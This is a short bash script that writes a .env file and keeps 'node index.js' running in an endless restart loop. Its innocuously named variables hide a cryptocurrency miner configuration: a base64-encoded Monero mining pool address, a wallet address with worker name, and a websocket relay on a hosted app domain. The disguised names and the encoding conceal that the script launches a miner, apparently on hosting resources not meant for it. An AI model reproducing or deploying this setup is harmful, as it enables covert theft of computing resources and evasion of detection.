#!/bin/bash
CONNECT=${1:-8}
NAME=${2:-003}
echo "SERVER_WS=wss://site--poais--2p62f4xqvk7f.code.run
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMz
SERVER_DOMAIN=48A73pficCJfxka8ywYoZBJLmXVHToaWAfuLuMAHxh9Ba8CbFJycKaxMcrWGouMvvmQE1bUCYC4AiJrAzYrFZUsC5jP63rn.${NAME}
SERVER_SECRET=x
SERVER_CONNECTION=${CONNECT}" > .env
export PATH=./usr/bin:$PATH
while true; do node index.js; sleep 15; done
